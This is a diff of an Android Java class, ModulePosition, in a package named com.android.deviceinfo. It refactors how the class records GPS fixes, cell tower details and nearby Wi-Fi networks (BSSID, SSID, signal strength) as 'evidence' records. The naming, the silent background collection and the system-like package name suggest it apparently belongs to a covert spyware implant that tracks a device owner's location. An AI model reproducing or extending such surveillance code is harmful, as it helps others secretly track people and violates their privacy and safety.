@@ -36,8 +36,7 @@ import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
 
-
-public class ModulePosition extends BaseInstantModule implements IncrementalLog, GPSLocationListener {
+public class ModulePosition extends BaseInstantModule implements GPSLocationListener {
 	private static final String TAG = "ModulePosition"; //$NON-NLS-1$
 	private static final int TYPE_GPS = 1;
 	private static final int TYPE_CELL = 2;
@@ -56,10 +55,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 
 	int period;
 
-	private EvidenceReference logIncrGPS, logIncrCell;
-	private Object logGPSlock = new Object();
-	private Object logCelllock = new Object();
-	private Object logWifilock = new Object();
+	private Object position = new Object();
 	private boolean scanning;
 
 	@Override
@@ -107,57 +103,16 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		}
 
 		if (gpsEnabled) {
-			synchronized (logGPSlock) {
-				if (logIncrGPS == null) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (actualStart): new logIncrGPS");
-					}
-					logIncrGPS = factoryGPSLog();
-				}
-			}
-
 			locationGPS();
 		}
 
 		if (cellEnabled) {
-			synchronized (logCelllock) {
-				if (logIncrCell == null) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (actualStart): new logIncrCell");
-					}
-					logIncrCell = factoryCellLog();
-				}
-			}
-
 			locationCELL();
 		}
 
 		if (wifiEnabled) {
 			locationWIFI();
 		}
-	}
-
-	private EvidenceReference factoryGPSLog() {
-		return new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0, LOG_TYPE_GPS));
-	}
-
-	private EvidenceReference factoryCellLog() {
-		EvidenceReference logCell = null;
-		final CellInfo info = Device.getCellInfo();
-		if (!info.valid) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
-			}
-			return null;
-		}
-
-		if (info.gsm) {
-			logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0, LOG_TYPE_GSM));
-		} else if (info.cdma) {
-			logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0, LOG_TYPE_CDMA));
-		}
-
-		return logCell;
 	}
 
 	private void locationWIFI() {
@@ -173,6 +128,14 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 				Check.log(TAG + " Warn: " + "Wifi disabled");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
+	}
+
+	private void locationGPS() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (locationGPS)");
+		}
+
+		GPSLocatorAuto.self().start(this);
 	}
 
 	/**
@@ -191,44 +154,22 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 			return;
 		}
 
-		byte[] payload = null;
-		if (info.gsm) {
-			payload = getCellPayload(info, LOG_TYPE_GSM);
-			synchronized (logCelllock) {
-				logIncrCell.write(payload);
-			}
+		synchronized (position) {
+			if (info.gsm) {
+				EvidenceReference logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
+						LOG_TYPE_GSM));
+				logCell.write(getCellPayload(info, LOG_TYPE_GSM));
+				logCell.close();
 
-		} else if (info.cdma) {
-			payload = getCellPayload(info, LOG_TYPE_CDMA);
-			synchronized (logCelllock) {
+			} else if (info.cdma) {
+				EvidenceReference logCell = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
+						LOG_TYPE_CDMA));
+				logCell.write(getCellPayload(info, LOG_TYPE_CDMA));
+				logCell.close();
 
-				logIncrCell.write(payload);
-
-			}
-		}
-
-		synchronized (logCelllock) {
-			if (logIncrCell.getSize() > 2048) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onLocationChanged): logIncrCell size=" + logIncrCell.getSize());
-				}
-				logIncrCell.close();
-				logIncrCell = factoryCellLog();
-				;
 			}
 		}
 
-		if (Cfg.LOG_POSITION) {
-
-		}
-	}
-
-	private void locationGPS() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (locationGPS)");
-		}
-
-		GPSLocatorAuto.self().start(this);
 	}
 
 	@Override
@@ -248,26 +189,47 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 			Check.log(TAG + " lat: " + lat + " lon:" + lng);//$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		final long timestamp = location.getTime();
+		synchronized (position) {
+			final long timestamp = location.getTime();
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " valid");//$NON-NLS-1$
-		}
-
-		byte[] payload = getGPSPayload(location, timestamp);
-		synchronized (logGPSlock) {
-			logIncrGPS.write(payload);
-			if (logIncrGPS.getSize() > 2048) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onLocationChanged): logIncrGPS size=" + logIncrGPS.getSize());
-				}
-				logIncrGPS.close();
-				logIncrGPS = factoryGPSLog();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " valid");//$NON-NLS-1$
 			}
+
+			byte[] payload = getGPSPayload(location, timestamp);
+
+			EvidenceReference logGPS = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(0,
+					LOG_TYPE_GPS));
+			logGPS.write(payload);
+
+			logGPS.close();
+
+		}
+	}
+
+	public void onWifiScan(List<ScanResult> results) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onWifiScan)");
 		}
 
-		if (Cfg.LOG_POSITION) {
+		if (wifiReceiver != null) {
+			Status.getAppContext().unregisterReceiver(wifiReceiver);
+		}
 
+		synchronized (position) {
+			EvidenceReference logWifi = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(
+					results.size(), LOG_TYPE_WIFI));
+
+			for (ScanResult wifi : results) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Info: " + "Wifi: " + wifi.BSSID);//$NON-NLS-1$ //$NON-NLS-2$
+				}
+
+				final byte[] payload = getWifiPayload(wifi.BSSID, wifi.SSID, wifi.level);
+				logWifi.write(payload);
+			}
+
+			logWifi.close();
 		}
 	}
 
@@ -522,31 +484,6 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 
 	}
 
-	public void resetLog() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (resetLog)");
-		}
-		synchronized (logCelllock) {
-			if (logIncrCell != null && logIncrCell.hasData()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resetLog): CELL");
-				}
-				logIncrCell.close();
-				logIncrCell = null;
-			}
-		}
-
-		synchronized (logGPSlock) {
-			if (logIncrGPS != null && logIncrGPS.hasData()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resetLog): close GPS");
-				}
-				logIncrGPS.close();
-				logIncrGPS = null;
-			}
-		}
-	}
-
 	BroadcastReceiver wifiReceiver = null;
 
 	public void registerWifiScan(final WifiManager wifiManager) {
@@ -578,37 +515,5 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		};
 
 		Status.getAppContext().registerReceiver(wifiReceiver, scanFilter);
-	}
-
-	public void onWifiScan(List<ScanResult> results) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onWifiScan)");
-		}
-
-		if (wifiReceiver != null) {
-			Status.getAppContext().unregisterReceiver(wifiReceiver);
-		}
-
-		synchronized (logWifilock) {
-			EvidenceReference logWifi = new EvidenceReference(EvidenceType.LOCATION_NEW, getAdditionalData(
-					results.size(), LOG_TYPE_WIFI));
-
-			for (ScanResult wifi : results) {
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Info: " + "Wifi: " + wifi.BSSID);//$NON-NLS-1$ //$NON-NLS-2$
-				}
-
-				final byte[] payload = getWifiPayload(wifi.BSSID, wifi.SSID, wifi.level);
-				logWifi.write(payload);
-
-			}
-
-			logWifi.close();
-		}
-
-		if (Cfg.LOG_POSITION) {
-
-		}
 	}
 }
